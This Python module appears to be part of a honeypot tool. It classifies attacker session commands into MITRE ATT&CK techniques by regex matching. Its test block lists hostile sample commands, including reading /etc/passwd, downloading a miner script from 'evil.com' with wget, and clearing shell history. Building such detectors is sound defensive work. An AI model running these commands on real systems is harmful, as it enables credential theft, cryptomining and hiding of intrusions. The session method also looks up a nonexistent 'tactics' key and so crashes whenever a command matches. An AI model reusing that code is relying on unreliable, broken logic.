# Author: TK
# Date: 09-06-2026
# Purpose: Takes session's commands and produces a list of MITRE ATT&CK techniques the attacker used.

import json
import re
from config import ATTACK_PATTERNS_FILE

class AttackClassifier:
    def __init__(self):
        with open(ATTACK_PATTERNS_FILE, "r") as file:
            data = json.load(file)
        self.patterns = data["patterns"]
        #pre-compile regex for performance
        for p in self.patterns:
            p["_compiled"] = [re.compile(r, re.IGNORECASE) for r in p.get("regex", [])]

    def classify_command(self, command: str) -> list:
        """Return a list of ATT&CK techniques matched by a single command."""
        matches = []
        for p in self.patterns:
            if any(rx.search(command) for rx in p["_compiled"]):
                matches.append({
                    "id": p["id"],
                    "name": p["name"],
                    "tactic": p["tactic"],
                    "description": p["description"],
                })

        return matches

    def classify_session(self, session: dict) -> dict:
        """Run classification across all commands in a session.
         Returns a dict with:
        - techniques: deduplicated list of unique techniques used
        - tactics: count of how many techniques per tactic
        - timeline: per-command list of matches (for visualization)
        """
        unique_techniques = {}
        tactic_counts = {}
        timeline = []

        for cmd in session.get("commands", []):
            matches = self.classify_command(cmd)
            timeline.append({"command": cmd, "techniques": matches})
            for m in matches:
                unique_techniques[m["id"]] = m
                tactic_counts[m["tactics"]] = tactic_counts.get(m["tactic"], 0) + 1

        return {
            "session_id": session.get("session_id"),
            "peer_ip": session.get("peer_ip"),
            "techniques": list(unique_techniques.values()),
            "tactic_counts": tactic_counts,
            "timeline": timeline,
            "technique_count": len(unique_techniques),
        }

# Quick CLI test
if __name__ == "__main__":
    classifier = AttackClassifier()
    test_commands = [
        "whoami",
        "cat /etc/passwd",
        "wget http://evil.com/miner.sh",
        "chmod +x miner.sh",
        "crontab -e",
        "history -c",
    ]
    for c in test_commands:
        result = classifier.classify_command(c)
        print(f"\n{c}")
        for r in result:
            print(f"  [{r['id']}] {r['name']} ({r['tactic']})")

